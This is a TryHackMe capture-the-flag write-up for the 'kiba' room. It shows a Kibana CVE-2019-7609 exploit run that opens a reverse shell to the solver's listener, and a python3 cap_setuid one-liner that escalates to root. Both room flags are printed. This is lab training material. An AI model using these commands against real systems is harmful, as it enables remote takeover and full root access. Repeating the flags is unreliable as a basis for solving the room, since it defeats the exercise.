## kiba - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/kiba)

**IP: 10.10.227.175**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Prototype Pollution <br>

**Tools Used**: Nmap<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan. Ffuf found nothing.

  ```
  nmap -sC -sV -T5 -p- 10.10.227.175

  PORT     STATE SERVICE      VERSION
  22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
  |   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
  |_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
  80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Site doesn't have a title (text/html).
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  5044/tcp open  lxi-evntsvc?
  5601/tcp open  http         Elasticsearch Kibana (serverName: kibana)
  | http-title: Kibana
  |_Requested resource was /app/kibana
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- For all of the questions before first flag, you can find the answers [here](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/).
  
- I knew that I had the exploit somewhere in my Kali but couldn't remember where lol. I'll post the exploit link as well.

---

## ⚙️ Shell Access

- OK, so for exploitation, this exploit it's very simple to use. Runs with Python2 and you need to provide few parameters: URL, host, port and shell. Exploit can be found [here](https://github.com/LandGrey/CVE-2019-7609.git).
  If execution is properly done you will get a reverse shell on target. Clone the repo, start a listener and run it.

  ```
  git clone https://github.com/LandGrey/CVE-2019-7609.git
  cd CVE-2019-7609

  python2 CVE-2019-7609-kibana-rce.py -u http://10.10.227.175:5601 -host [YOUR-THM-IP] -port 4444 --shell
  [+] http://10.10.227.175:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
  [+] reverse shell completely! please check session on: [YOUR-THM-IP]:4444
  
  nc -lvnp 4444            
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.227.175] 36748
  bash: cannot set terminal process group (949): Inappropriate ioctl for device
  bash: no job control in this shell
  To run a command as administrator (user "root"), use "sudo <command>".
  See "man sudo_root" for details.
  
  kiba@ubuntu:/home/kiba/kibana/bin$ whoami
  whoami
  kiba
  kiba@ubuntu:/home/kiba/kibana/bin$
  ```
  
- Awesome, capturing flags now.

---

## 🧍 User Privilege Escalation

- User flag is pretty straightforward.

  ```
  kiba@ubuntu:/home/kiba$ ls
  ls
  elasticsearch-6.5.4.deb  kibana  user.txt
  
  kiba@ubuntu:/home/kiba$ cat user.txt
  cat user.txt
  THM{1s_easy_pwn3d_k1bana_w1th_rce}
  ```
  
- Moving to escalation.

---

## 👑 Root Privilege Escalation

- Cronjobs and `sudo -l` did nothing, but when I checked for capabilities I found the way to root.

  ```
  kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
  getcap -r / 2>/dev/null
  /home/kiba/.hackmeplease/python3 = cap_setuid+ep
  /usr/bin/mtr = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
  /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
  ```
  
- Here I tought that you always have to copy Python somewhere else in order to escalate, but that's not true since it didn't work for me that way at all. Then I just ran it as it is and got the root. One liner exploit can be found on GTFOBins.

  ```
  kiba@ubuntu:/home/kiba/.hackmeplease$ ls -al
  ls -al
  total 4356
  drwxrwxr-x 2 kiba kiba    4096 Mar 31  2020 .
  drwxr-xr-x 6 kiba kiba    4096 May 14 04:16 ..
  -rwxr-xr-x 1 root root 4452016 Mar 31  2020 python3
  
  kiba@ubuntu:/home/kiba/.hackmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  <kmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'     
  # whoami
  whoami
  root
  
  # cat /root/root.txt
  cat /root/root.txt
  THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
  ```
  
- Cya in the next one!

---

## 🏁 Flags

- **User Flag**: `THM{1s_easy_pwn3d_k1bana_w1th_rce}`
- **Root Flag**: `THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding where I saved exploit from last time...`

- What did I learn?
  `That sometimes you don't have to copy Python in order to escalate, if it's a capability you can just run it.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
